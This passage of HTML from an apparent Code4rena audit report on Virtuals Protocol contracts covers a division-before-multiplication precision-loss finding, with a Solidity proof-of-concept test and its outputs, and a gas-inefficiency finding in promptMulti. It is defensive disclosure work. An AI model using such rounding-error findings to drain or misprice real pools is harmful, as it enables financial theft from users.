class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAlthough this model is implemented to calculate the \u003ccode\u003ek\u003c/code\u003e, we can see there is a hidden division before a multiplication that makes round down the whole expression. This is bad as the precision loss can be significant, which leads to the pool calculating less \u003ccode\u003eliquidity\u003c/code\u003e than actual.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-30\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-30\" aria-label=\"recommended mitigation steps 30 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eConsider changing the \u003ccode\u003eliquidity\u003c/code\u003e calculation in the way that prioritize the multiplication over division or use the high precision fixed point math libraries (e.g. PRB math lib).\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-19\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-19\" aria-label=\"proof of concept 19 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"125\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econstant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e3_000_000_000_000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etestPrecisionLoss\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupply\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epure\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eacc\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ek\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = ((\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (((\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ek\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eacc\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eFor the \u003ccode\u003eassetRate\u003c/code\u003e and \u003ccode\u003esupply\u003c/code\u003e equal to (\u003ccode\u003e7.98e15\u003c/code\u003e, \u003ccode\u003e1.9283e18\u003c/code\u003e):\u003c/p\u003e\n\u003cp\u003eThe result would be:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"126\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e     Current Implementation  1555700000000000000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e     Actual Implementation   1949592125831354822\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis is equal to \u003ccode\u003e~25%\u003c/code\u003e relative error. Also, it is worth to mention that in some cases even the liquidity becomes zero. For the \u003ccode\u003eassetRate\u003c/code\u003e and \u003ccode\u003esupply\u003c/code\u003e equal to (\u003ccode\u003e1e18\u003c/code\u003e, \u003ccode\u003e2e18\u003c/code\u003e), the result would be:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"127\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e     Current Implementation  0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e     Actual Implementation   15000000000000000\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"\u003e\u003ca href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eLow Risk and Non-Critical Issues\u003c/h1\u003e\n\u003cp\u003eFor this audit, 38 reports were submitted by wardens detailing low risk and non-critical issues. The \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-853\"\u003ereport highlighted below\u003c/a\u003e by \u003cstrong\u003eSparrow\u003c/strong\u003e received the top score from the judge.\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eThe following wardens also submitted reports: \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-759\"\u003e0xdonchev\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-811\"\u003e0xhp9\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-402\"\u003ealessio\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-840\"\u003eAnyasaa\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-629\"\u003eBlackAdam\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-266\"\u003ecerweb10\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-805\"\u003echupinexx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-219\"\u003ecodexNature\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-751\"\u003eDanielTan\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-675\"\u003eDanielTan_MetaTrust\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-71\"\u003eFavourOkerri\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-405\"\u003efrancoHacker\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-788\"\u003egeraldwenzel\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-850\"\u003egkrastenov\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-837\"\u003ejeffy\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-170\"\u003ejoicygiore\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-792\"\u003eK42\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-746\"\u003eLeoGold\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-615\"\u003eLhoussainePh\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-410\"\u003enatachi\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-600\"\u003enewspacexyz\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-851\"\u003eNexarion\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-699\"\u003ePelz\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-684\"\u003ePolarizedLight\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-436\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-21\"\u003eRice_T\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-616\"\u003eRoger\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-227\"\u003esafie\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-65\"\u003eShinobi\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-789\"\u003eSilverwind\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-571\"\u003eslowbugmayor\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-25\"\u003esungjun0208\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-213\"\u003etacitvs\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-319\"\u003eTheCarrot\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-761\"\u003eunique\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-59\"\u003ezhanmingjing\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-599\"\u003ezubyoz\u003c/a\u003e.\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eNote: QA report issues deemed invalid by the judge have been omitted from this report.\u003c/em\u003e\u003c/p\u003e\n\u003ch2 id=\"01-missing-update-of-prevagentid-in-promptmulti\" style=\"position:relative;\"\u003e\u003ca href=\"#01-missing-update-of-prevagentid-in-promptmulti\" aria-label=\"01 missing update of prevagentid in promptmulti permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[01] Missing update of \u003ccode\u003eprevAgentId\u003c/code\u003e in \u003ccode\u003epromptMulti\u003c/code\u003e\u003c/h2\u003e\n\u003cp\u003eThe \u003ccode\u003epromptMulti\u003c/code\u003e function in \u003ccode\u003eAgentInference.sol\u003c/code\u003e is intended to optimize repeated calls to \u003ccode\u003eagentNft.virtualInfo(agentId).tba\u003c/code\u003e by caching the previous \u003ccode\u003eagentId\u003c/code\u003e and its corresponding TBA address. However, the variable \u003ccode\u003eprevAgentId\u003c/code\u003e is never updated within the loop. As a result, the optimization is non-functional: for each iteration, the contract will call \u003ccode\u003eagentNft.virtualInfo(agentId).tba\u003c/code\u003e whenever the current \u003ccode\u003eagentId\u003c/code\u003e is not zero, regardless of whether the agent ID has changed from the previous iteration. This leads to unnecessary repeated external calls, increasing gas costs and reducing efficiency.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/ba460bcbc56555f0c4f270c04e9c2375274059d1/contracts/AgentInference.sol#L80-L91\"\u003eAgentInference.sol#L80-L91\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"128\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprevAgentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elen\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprevAgentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtualInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einferenceCount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]++;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ePrompt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epromptHashes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecoreIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-31\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-31\" aria-label=\"recommended mitigation steps 31 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eUpdate \u003ccode\u003eprevAgentId\u003c/code\u003e to the current \u003ccode\u003eagentId\u003c/code\u003e after fetching a new TBA address within the loop. This ensures that the optimization works as intended and redundant calls are avoided.\u003c/p\u003e\n\u003ch2 id=\"02-duplicate-import-statement-for-mathsol\" style=\"position:relative;\"\u003e\u003ca href=\"#02-duplicate-import-statement-for-mathsol\" aria-label=\"02 duplicate import statement for mathsol permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 